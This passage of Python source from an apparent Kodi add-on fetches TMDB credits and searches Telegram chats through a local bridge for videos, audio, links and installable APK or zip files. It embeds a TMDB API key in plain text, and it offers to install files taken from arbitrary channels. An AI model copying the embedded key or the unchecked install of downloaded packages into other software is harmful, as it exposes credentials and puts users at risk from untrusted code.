    if tv_mode=='movie':
       link='https://api.themoviedb.org/3/person/%s?api_key=1180357040a128da71b71716058f6c5c&append_to_response=credits&language=%s&sort_by=popularity.desc'%(url,lang)
    else:
       link='https://api.themoviedb.org/3/person/%s/tv_credits?api_key=1180357040a128da71b71716058f6c5c&append_to_response=credits&language=%s&sort_by=popularity.desc'%(url,lang)
   
    headers = {
                                
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.5',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '1',
                            }
    html=requests.get(link,headers=headers).json()
    if tv_mode=='movie':
        url_g='https://'+'api.themoviedb.org/3/genre/movie/list?api_key=1180357040a128da71b71716058f6c5c&language=%s'%lang
                 
    else:
       url_g='https://'+'api.themoviedb.org/3/genre/tv/list?api_key=1180357040a128da71b71716058f6c5c&language=%s'%lang
    html_g=requests.get(url_g,headers=headers).json()
    if tv_mode=='movie':
      test=html['credits']['cast']
      mode=15
    else:
      test=html['cast']
      mode=16
    aa=[]
    i=[]
    try:
      if Addon.getSetting("trakt_access_token")!='' and Addon.getSetting("trakt_info")=='true':
        from resources.modules.general import call_trakt
        i = (call_trakt('/users/me/watched/movies'))
    except Exception as e:
        
        i=[]
    
    all_movie_w=[]
    for ids in i:
      all_movie_w.append(str(ids['movie']['ids']['tmdb']))
    
    
    for items in test:
        watched='no'
        if str(items['id']) in all_movie_w:
           watched='yes'
        
        
        add_n=items['character']
        logging.warning(add_n)
        icon=items['poster_path']
        fanart=items['backdrop_path']
        if icon==None:
          icon=' '
        else:
          icon='https://'+'image.tmdb.org/t/p/original/'+icon
        if fanart==None:
          fanart=' '
        else:
          fanart='https://'+'image.tmdb.org/t/p/original/'+fanart
        
        plot=items['overview']
        if tv_mode=='movie':
          original_title=items['original_title']
        else:
          original_title=items['original_name']
        id=items['id']
        rating=items['vote_average']
        if tv_mode=='movie':
          title=items['title']
        else:
          title=items['name']
        if 'first_air_date' in items:
           if items['first_air_date']==None:
                    year=' '
           else:
                year=str(items['first_air_date'].split("-")[0])
        else:
            if 'release_date' in items:
              if items['release_date']==None:
                    year=' '
              else:
                year=str(items['release_date'].split("-")[0])
            else:
              year=' '
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                    if i['name'] is not None])
        genere = u' / '.join([genres_list[x] for x in items['genre_ids']])
        #except:genere=''
        
        video_data={}
        video_data['title']=title+' [COLOR blue](%s)[/COLOR]'%add_n
        #video_data['poster']=fanart
        video_data['plot']=plot
        #video_data['icon']=icon
        video_data['genre']=genere
        video_data['rating']=rating
        video_data['year']=year
        trailer = "plugin://plugin.video.telemedia?mode=171&id=%s&url=%s" % (id,tv_mode)
        aa.append(addDir3(title+' [COLOR blue](%s)[/COLOR]'%add_n,'www',mode,icon,fanart,plot,data=year,original_title=original_title,id=str(id),rating=rating,heb_name=title,show_original_year=year,isr=' ',generes=genere,video_info=video_data,trailer=trailer,watched=watched))
    if tv_mode=='movie':
      test=html['credits']['crew']
      mode=15
    else:
      test=html['crew']
      mode=16
    for items in test:
        watched='no'
        if str(items['id']) in all_movie_w:
           watched='yes'
        add_n=items['department']
        icon=items['poster_path']
        fanart=items['backdrop_path']
        if icon==None:
          icon=' '
        else:
          icon='https://'+'image.tmdb.org/t/p/original/'+icon
        if fanart==None:
          fanart=' '
        else:
          fanart='https://'+'image.tmdb.org/t/p/original/'+fanart
        plot=items['overview']
        if tv_mode=='movie':
          original_title=items['original_title']
        else:
          original_title=items['original_name']
        id=items['id']
        rating=items['vote_average']
        if tv_mode=='movie':
          title=items['title']
        else:
          title=items['name']
        if 'first_air_date' in items:
           if items['first_air_date']==None:
                    year=' '
           else:
                year=str(items['first_air_date'].split("-")[0])
        else:
            if 'release_date' in items:
              if items['release_date']==None:
                    year=' '
              else:
                year=str(items['release_date'].split("-")[0])
            else:
              year=' '
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                    if i['name'] is not None])
        genere = u' / '.join([genres_list[x] for x in items['genre_ids']])
        #except:genere=''
        
        video_data={}
        video_data['title']=title+' [COLOR yellow](%s)[/COLOR]'%add_n
        #video_data['poster']=fanart
        video_data['plot']=plot
        #video_data['icon']=icon
        video_data['genre']=genere
        video_data['rating']=rating
        video_data['year']=year
        trailer = "%s?mode=25&id=%s&url=%s" % (sys.argv,id,tv_mode)
        aa.append(addDir3(title+' [COLOR yellow](%s)[/COLOR]'%add_n,'www',mode,icon,fanart,plot,data=year,original_title=original_title,id=str(id),rating=rating,heb_name=title,show_original_year=year,isr=' ',generes=genere,video_info=video_data,trailer=trailer,watched=watched))
        
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)

    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_RATING)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),aa,len(aa))
    
def utf8_simple(params):
    
    # problem: u.urlencode(params.items()) is not unicode-safe. Must encode all params strings as utf8 first.
    # UTF-8 encodes all the keys and values in params dictionary
    try:
        params = params.encode('utf-8')
    except:
        params='ERROR'
            
    
    return params
def clean_name(name,original_title):
    name=name.replace('.mp4','').replace('.avi','').replace('.mkv','').replace(original_title,'')
    return name
def file_list(id,page,last_id_all,quary,icon_pre,fan_pre,image_master='',original_title=''):
   try:
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""season TEXT, ""episode TEXT,""playtime TEXT,""total TEXT, ""free TEXT);" % 'playback')
        dbcon.commit()

        dbcur.execute("SELECT * FROM playback")
        match = dbcur.fetchall()
        all_w={}
        for n,tm,s,e,p,t,f in match:
            ee=clean_name(str(n),original_title).encode('base64')
            all_w[ee]={}
            all_w[ee]['resume']=str(p)
            all_w[ee]['totaltime']=str(t)
        link_types=['upfile','drive.google','youtube','youtu.be','.m3u8','twitch']
        from resources.modules.tmdb import get_html_g
        from resources.modules import cache
        html_g_tv,html_g_movie=cache.get(get_html_g,72, table='posters_n')
        all_d=[]
        icon_pre=telemaia_icon
        fan_pre=telemaia_fan
        if image_master!='':
            fan_pre=image_master.split('$$$')[1]
            icon_pre=image_master.split('$$$')[0]
        fan_o=fan_pre
        icon_o=icon_pre
        if 'from_plot' in quary:
            quary=' '
            dont_s_again=True
        else:
            dont_s_again=False
            search_entered=''
            #'Enter Search'
            keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
            keyboard.doModal()
            if keyboard.isConfirmed():
                    quary = keyboard.getText()
            else:
                return 0
        import random
      
        last_id_doc=last_id_all.split('$$$')[0]
        last_id=last_id_all.split('$$$')[1]
        last_id_link=last_id_all.split('$$$')[2]
        last_id_audio=last_id_all.split('$$$')[3]
        
        disp_files=Addon.getSetting("disp_f")=='true'
        disp_vid=Addon.getSetting("disp_v")=='true'
        disp_links=Addon.getSetting("disp_l")=='true'
        disp_audio=Addon.getSetting("disp_a2")=='true'
        
        disp_repo=Addon.getSetting("repo")=='true'
        
        download_full_files=Addon.getSetting("download_files")=='true'
        
        num=random.randint(1,1001)
        plat='windows'
        if sys.platform.lower().startswith('linux'):
        
            if 'ANDROID_DATA' in os.environ:
                plat = 'android'
        on_android=False
        if Addon.getSetting("install_apk")=='true':
            on_android=plat == 'android'
        if last_id_audio!='-99' and disp_audio:
            num=random.randint(1,1001)
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(id), 'query': quary.strip(),'from_message_id':int(last_id_audio),'offset':0,'filter':{'@type': 'searchMessagesFilterAudio'},'limit':100, '@extra': num})
                 }
           
           
           
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
           
            counter_ph=1000
            for items in event['messages']:  
                    
                    
                    name=items['content']['audio']['title']
                    
                    size=items['content']['audio']['audio']['size']
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    icon=icon_pre
                    fan=fan_pre
                    if 'album_cover_thumbnail' in items['content']['audio']:
                        if 'photo' in items['content']['audio']['album_cover_thumbnail']:
                            counter_ph+=1
                            icon_id=items['content']['audio']['album_cover_thumbnail']['photo']['id']
                            f_name=items['content']['audio']['album_cover_thumbnail']['photo']['remote']['id']+'.jpg'
                            mv_name=os.path.join(icons_path,f_name)
                            if os.path.exists(mv_name):
                                icon=mv_name
                            else:
                               icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                            
                            fan=icon
                    dur=items['content']['audio']['duration']
                    t=time.strftime("%H:%M:%S", time.gmtime(dur))
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                    name=clean_name(name,original_title)
                    link_data={}
                    link_data['id']=str(items['content']['audio']['audio']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    addLink( '[COLOR lime]'+name+'[/COLOR]',f_lk ,3,False, icon,fan,f_size2+'\n'+t+'\nMusic File',da=da,all_w=all_w,in_groups=True)
                    
                
            last_id_audio=-99
            try:
             last_id_audio=items['id']
             last_id_audio_found=1
            except:
             pass
     
        if last_id_doc!='-99' and disp_files:
           num=random.randint(1,1001)
           data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(id), 'query': quary.strip(),'from_message_id':int(last_id_doc),'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':100, '@extra': num})
                 }
           
           
           #data={'type':'td_send',
           #      'info':json.dumps({'@type': 'getChatHistory','chat_id':long(id), 'from_message_id': 0,'offset':0,'limit':10, '@extra':num})
           #      }
           event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
           
           for items in event['messages']:  
               
                if 'document' not in items['content']:
                    continue
                ok_name=True
                file_name=items['content']['document']['file_name']
                if 'document' in items['content']:
                    if 'caption' in items['content']:
                        if 'text' in items['content']['caption']:
                            if len(items['content']['caption']['text'])>0:
                                name=items['content']['caption']['text']
                                ok_name=False
                    if ok_name:
                        name=file_name
                    if Addon.getSetting("files_display_type")=='0':
                        name=file_name
                    c_name=[]
                    if '\n' in name:
                        f_name=name.split('\n')
                        for it in f_name:
                            if '😎' not in it and it!='\n' and len(it)>1 and '💠' not in it:
                                c_name.append(it)
                        name='\n'.join(c_name)
                    
                        
                    if not(download_full_files and '_files_' in original_title.lower()):
                        
                        if on_android and 'apk' in original_title.lower():
                            if '.mkv' not in file_name and '.mp4' not in file_name and '.avi' not in file_name and '.zip' not in file_name and '.apk' not in file_name:
                                continue
                        elif disp_repo and 'repo' in original_title.lower():
                            
                            if '.mkv' not in file_name and '.mp4' not in file_name and '.apk' not in file_name and '.avi' not in file_name and '.zip' not in file_name:
                                continue
                        else:
                            if '.mkv' not in file_name and '.mp4' not in file_name and '.avi' not in file_name and '.apk' not in file_name:
                                continue
                    size=items['content']['document']['document']['size']
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    if Addon.getSetting("remove_title")=='true':
                        name=name.replace(original_title,'').replace('@'+original_title,'')
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                    regex='.*([1-3][0-9]{3})'
                    year_pre=re.compile(regex).findall(name)
                    year=0
                    if len(year_pre)>0:
                        year=year_pre[0]
                    mode=3
                    o_name=name
                    if '.zip'  in name:
                        name='[COLOR gold]'+name+'[/COLOR]'
                        mode=24
                    if '.apk'  in file_name:
                        name='[COLOR gold]'+name+'[/COLOR]'
                        mode=32
                    
                    if (download_full_files and '_files_' in original_title.lower()):
                        mode=36
                        name='[COLOR khaki]'+name+'[/COLOR]'
                        
                    name=clean_name(name,original_title)
                    link_data={}
                    link_data['id']=str(items['content']['document']['document']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    addLink( name,f_lk ,mode,False, icon_pre,fan_pre,f_size2,da=da,year=year,original_title=o_name,all_w=all_w,in_groups=True)
                
                
           last_id_doc=-99
           try:
            last_id_doc=items['id']
            last_id_doc_found=1
           except:
            pass
        else:
           last_id_doc=-99
           last_id_doc_found=0
        if last_id!='-99' and disp_vid:
            num=random.randint(1,1001)
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(id), 'query': quary.strip(),'from_message_id':int(last_id),'offset':0,'filter':{'@type': 'searchMessagesFilterVideo'},'limit':100, '@extra': num})
                 }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            for items in event['messages']:  
                #logging.warning(items)
                if 'video' in items['content']:
                    ok_name=True
                    if 'caption' in items['content']:
                        if 'text' in items['content']['caption']:
                            if len(items['content']['caption']['text'])>0:
                                name=items['content']['caption']['text']
                                ok_name=False
                    if ok_name:
                        name=items['content']['video']['file_name']
                    if Addon.getSetting("video_display_type")=='0':
                        name=items['content']['video']['file_name']
                    c_name=[]
                    if '\n' in name:
                        f_name=name.split('\n')
                        for it in f_name:
                            if '😎' not in it and it!='\n' and len(it)>1:
                                c_name.append(it)
                        name='\n'.join(c_name)
                    size=items['content']['video']['video']['size']
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    plot=''
                    
                    if 'caption' in items['content']:
                        plot=items['content']['caption']['text']
                        
                        if '\n' in plot and len(name)<3:
                                name=plot.split('\n')[0]
                    
                    if Addon.getSetting("remove_title")=='true':
                        name=name.replace(original_title,'').replace('@'+original_title,'')
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                    regex='.*([1-3][0-9]{3})'
                    year_pre=re.compile(regex).findall(name)
                    year=0
                    if len(year_pre)>0:
                        year=year_pre[0]
                    name=clean_name(name,original_title)
                    link_data={}
                    link_data['id']=str(items['content']['video']['video']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    addLink( name,f_lk,3,False, icon_pre,fan_pre,f_size2+'\n'+plot.replace('\n\n',' - '),da=da,year=year,all_w=all_w,in_groups=True)
                
                
               
            last_id=-99
            try:
                last_id=items['id']
            except:
                pass
                
            
        else:
            last_id=-99
        
        
        if last_id_link!='-99' and disp_links:
           num=random.randint(1,1001)
           data={'type':'td_send',
                 'info':json.dumps({'@type': 'searchChatMessages','chat_id':(id), 'query': quary,'from_message_id':int(last_id_link),'offset':0,'filter':{'@type': 'searchMessagesFilterUrl'},'limit':100, '@extra': num})
                 }
           
           
           #data={'type':'td_send',
           #      'info':json.dumps({'@type': 'getChatHistory','chat_id':long(id), 'from_message_id': 0,'offset':0,'limit':10, '@extra':num})
           #      }
           event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()

           
           counter_ph=0
           for items in event['messages']:  
   
                if 'web_page' in items['content']:
                    name=items['content']['web_page']['title']
                    link=items['content']['web_page']['url']
                    plot=items['content']['web_page']['description']
                    all_l=[link]
                    ok=False
                    for items_in in link_types:
                        if items_in in link:
                            ok=True
                            break
                            
                    if not ok:
                          
                          continue
                        
                    
                    if 'text' in items['content']:
                        txt_lines=items['content']['text']['text'].split('\n')
                        
                        rem_lines=[]
                        
                        for lines in txt_lines:
                            ok=False
                            for items_in in link_types:
                                if items_in in lines:
                                    ok=True
                                    break
                                    
                            if not ok:
                                  
                                  continue
                            
                                
                            all_l.append(lines)
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']['web_page']:
                        counter_ph+=1
                        icon_id=items['content']['web_page']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        counter_ph+=1
                        loc=items['content']['web_page']['photo']['sizes']
                        icon_id=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                    name=clean_name(name,original_title)
                    
                    addLink('[COLOR lightgreen]'+ name+'[/COLOR]', utf8_simple('$$$'.join(all_l)),9,False, icon,fan,plot.replace('\n\n','\n'),da=da,all_w=all_w,in_groups=True)
                elif 'caption' in items['content']:
                    txt_lines=items['content']['caption']['text'].split('\n')
                    all_l=[]
                    rem_lines=[]
                    
                    for lines in txt_lines:
                        ok=False
                        for items_in in link_types:
                            if items_in in lines:
                                ok=True
                                break
                                
                        if not ok:
                              rem_lines.append(lines)
                              continue
                        
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']:
                        counter_ph+=1
                        
                        icon_id=items['content']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        counter_ph+=1
                        loc=items['content']['photo']['sizes']
                        icon_id=items['content']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                       
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                    
                    addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]', utf8_simple('$$$'.join(all_l)),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),da=da,all_w=all_w,in_groups=True)
                
                elif 'text' in items['content']:
                    txt_lines=items['content']['text']['text'].split('\n')
                    all_l=[]
                    rem_lines=[]
                    
                    for lines in txt_lines:
                        ok=False
                        for items_in in link_types:
                            if items_in in lines:
                                ok=True
                                break
                                
                        if not ok:
                              rem_lines.append(lines)
                              continue
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']:
                        counter_ph+=1
                        icon_id=items['content']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        
                        counter_ph+=1
                        
                        loc=items['content']['photo']['sizes']
                        icon_id=items['content']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                       
                    if 'date' in items:
                        da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
                   
                    addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]', utf8_simple('$$$'.join(all_l)),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),da=da,all_w=all_w,in_groups=True)
                
                
                
           last_id_link=-99
           try:
            last_id_link=items['id']
            
           except:
            pass
        else:
           last_id_link=-99
          
           
        if last_id_doc==-99 and last_id==-99 and last_id_link==-99 and last_id_audio==-99:
            xbmcgui.Dialog().ok(Addon.getLocalizedString(32052),Addon.getLocalizedString(32059))
        f_last_id=str(last_id_doc)+'$$$'+str(last_id)+'$$$'+str(last_id_link)+'$$$'+str(last_id_audio)
        if quary==' ':
            quary='from_plot'
        #Next Page
        aa=addDir3('[COLOR yellow]'+Addon.getLocalizedString(32026)+'[/COLOR]',str(id),2,'https://www.5thtackle.com/wp-content/uploads/2017/04/next-page.jpg','https://www.mcgill.ca/continuingstudies/files/continuingstudies/next-page-magazine.png',quary,data=str(int(page)+1),last_id=f_last_id,image_master=icon_o+'$$$'+fan_o)
        all_d.append(aa) 
        if dont_s_again:
            f_last_id='0$$$0$$$0$$$0'
            #'Search'
            aa=addDir3('[COLOR khaki]'+Addon.getLocalizedString(32027)+'[/COLOR]',str(id),2,'https://sitechecker.pro/wp-content/uploads/2017/12/search-engines.png','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','search',data='0',last_id=f_last_id,image_master=image_master)
            all_d.append(aa)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
   except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN Main:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
def  last_played():
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    
    table_name='lastlinktv'
    
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""o_name TEXT,""name TEXT, ""url TEXT, ""iconimage TEXT, ""fanart TEXT,""description TEXT,""data TEXT,""season TEXT,""episode TEXT,""original_title TEXT,""saved_name TEXT,""heb_name TEXT,""show_original_year TEXT,""eng_name TEXT,""isr TEXT,""prev_name TEXT,""id TEXT);"%table_name)
    
    table_name='lastlinkmovie'
    
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""o_name TEXT,""name TEXT, ""url TEXT, ""iconimage TEXT, ""fanart TEXT,""description TEXT,""data TEXT,""season TEXT,""episode TEXT,""original_title TEXT,""saved_name TEXT,""heb_name TEXT,""show_original_year TEXT,""eng_name TEXT,""isr TEXT,""prev_name TEXT,""id TEXT);"%table_name)
    
    
    dbcur.execute("SELECT * FROM lastlinktv WHERE o_name='f_name'")

    match_tv = dbcur.fetchone()
    
    dbcur.execute("SELECT * FROM lastlinkmovie WHERE o_name='f_name'")

    match_movie = dbcur.fetchone()
    
    dbcon.commit()
    
    dbcur.close()
    dbcon.close()
    all=[]
    if match_tv!=None:
       aa=addNolink2( '[COLOR blue][I]---TV---[/I][/COLOR]', 'www',999,False,fanart=' ', iconimage=' ',plot=' ',dont_place=True)
       all.append(aa)
       f_name,name,url,iconimage,fanart,description,data,season,episode,original_title,saved_name,heb_name,show_original_year,eng_name,isr,prev_name,id=match_tv
       try:
           if url!=' ':
             if 'http' not  in url:
           
               url=url.decode('base64')
             if len(episode)==1:
              episode_n="0"+episode
             else:
               episode_n=episode
             if len(season)==1:
              season_n="0"+season
             else:
              season_n=season
             aa=addLink2(original_title+' - S%sE%s'%(season_n,episode_n), url,3,False,iconimage,fanart,description,data=show_original_year,original_title=original_title,season=season,episode=episode,tmdb=id,year=show_original_year,place_control=True)
             all.append(aa)
       except  Exception as e:
         logging.warning(e)
         pass
    if match_movie!=None:
          # addNolink('[COLOR red][I]'+ responce['title']+'[/I][/COLOR]', 'www',999,False)
       aa=addNolink2( '[COLOR blue][I]---Movie---[/I][/COLOR]', 'www',999,False,fanart=' ', iconimage=' ',plot=' ',dont_place=True)
       all.append(aa)
       f_name,name,url,iconimage,fanart,description,data,season,episode,original_title,saved_name,heb_name,show_original_year,eng_name,isr,prev_name,id=match_movie
       try:
           if url!=' ':
             if 'http' not  in url:
           
               url=url.decode('base64')
              
             aa=addLink2(original_title, url,3,False,iconimage,fanart,description,data=show_original_year,original_title=original_title,season=season,episode=episode,tmdb=tmdb,year=show_original_year,place_control=True)
             # addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
             all.append(aa)
       except  Exception as e:
         logging.warning(e)
         pass
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all,len(all))
def get_direct_bot_link(c_id,m_id):
   try:
    bot_id=Addon.getSetting("bot_id")#'772555074'
    num=random.randint(0,60000)
    data={'type':'td_send',
         'info':json.dumps({'@type': 'forwardMessages','chat_id':(bot_id), 'from_chat_id': c_id,'message_ids':[m_id], '@extra': num})
         }

    logging.warning('sending')
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    new_link='empty'
    logging.warning('Wait')
    counter_sh=0
    data={'type':'clean_last_link',
             'info':''
             }


    test=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
    while(new_link=='empty'):
        data={'type':'get_last_link',
             'info':''
             }


        new_link=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        if new_link=='Found':
            logging.warning( 'Limit')
            break
        time.sleep(0.1)
        counter_sh+=1
        if (counter_sh>100):
            logging.warning('Timeout')
    
    headers = {
      
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        
        'Content-Type': 'application/json;charset=utf-8',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        }
    if new_link=='Found':
        return new_link
    x=requests.get(new_link,headers=headers).content
    f_link=re.compile('source src="(.+?)"').findall(x)[0]
    return  f_link
   except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN bot:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmcgui.Dialog().ok('Error occurred','Err in bot:'+str(e)+'Line:'+str(lineno))
def save_to_fav(plot):

    
    
    save_file=os.path.join(user_dataDir,"fav.txt")
    file_data=[]
    change=0
    cache.clear(['save_file'])
    if os.path.exists(save_file):
        f = open(save_file, 'r')
        file_data = f.readlines()
        f.close()
    
    if plot+'\n' not in file_data:
      file_data.append(plot)
      change=1
    for i in range (len(file_data)-1,0,-1):
         file_data[i]=file_data[i].replace('\n','')
         if len(file_data[i])<3:
          
          file_data.pop(i)
          change=1
    if change>0:
       
          file = open(save_file, 'w')
          file.write('\n'.join(file_data))
          file.close()
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]נשמר[/COLOR]' % COLOR2)
def open_fav(url):
    save_file=os.path.join(user_dataDir,"fav.txt")
    if url=='movies':
      type='movies'
    elif url=='tv':
      type='tv'
    else:
      type='all'
    url=None
    name=None
    mode=None
    iconimage=None
    fanart=None
    description=None
    original_title=None
    file_data=[]
    change=0

    if os.path.exists(save_file):
        f = open(save_file, 'r')
        file_data = f.readlines()
        f.close()
    num=0
    for items in file_data:
       if len(items)>1:
            list1=items.split("$$")
            full_str=''
            for item_as in list1:
              full_str=full_str+chr(int(item_as))
            
            params=get_custom_params(full_str)
           
            url=None
            name=None
            mode=None
            iconimage=None
            fanart=None
            description=None
            original_title=None
            data=0
            id=' '
            season=0
            episode=0
            show_original_year=0
            heb_name=' '
            tmdbid=' '
            eng_name=' '
            try:
                    url=urllib.unquote_plus(params["url"])
            except:
                    pass
            try:
                    name=urllib.unquote_plus(params["name"])
            except:
                    pass
            try:
                    iconimage=urllib.unquote_plus(params["iconimage"])
            except:
                    pass
            try:        
                    mode=int(params["mode"])
            except:
                    pass
            try:        
                    fanart=urllib.unquote_plus(params["fanart"])
            except:
                    pass
            try:        
                    description=urllib.unquote_plus(params["description"])
            except:
                    pass
            try:        
                    data=urllib.unquote_plus(params["data"])
            except:
                    pass
            try:        
                    original_title=(params["original_title"])
            except:
                    pass
            try:        
                    id=(params["id"])
            except:
                    pass
            try:        
                    season=(params["season"])
            except:
                    pass
            try:        
                    episode=(params["episode"])
            except:
                    pass
            try:        
                    tmdbid=(params["tmdbid"])
            except:
                    pass
            try:        
                    eng_name=(params["eng_name"])
            except:
                    pass
            try:        
                    show_original_year=(params["show_original_year"])
            except:
                    pass
            try:        
                    heb_name=(params["heb_name"])
            except:
                    pass
            
            te1=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)
            
            te2="&name="+(name)+"&iconimage="+urllib.quote_plus(iconimage)+"&fanart="+urllib.quote_plus(fanart)+"&description="+urllib.quote_plus(description)+"&heb_name="+urllib.quote_plus(heb_name)
    
            te3="&data="+str(data)+"&original_title="+urllib.quote_plus(original_title)+"&id="+(id)+"&season="+str(season)
            te4="&episode="+str(episode)+"&tmdbid="+str(tmdbid)+"&eng_name="+(eng_name)+"&show_original_year="+(show_original_year)
     
           
            
            all=[]
            u=te1 + te2 + te3 + te4.decode('utf8')
            link="ActivateWindow(10025,%s,return)" % (u)
            if (type=='movies' and mode==15) or type=='all' or (type=='tv' and mode==20):
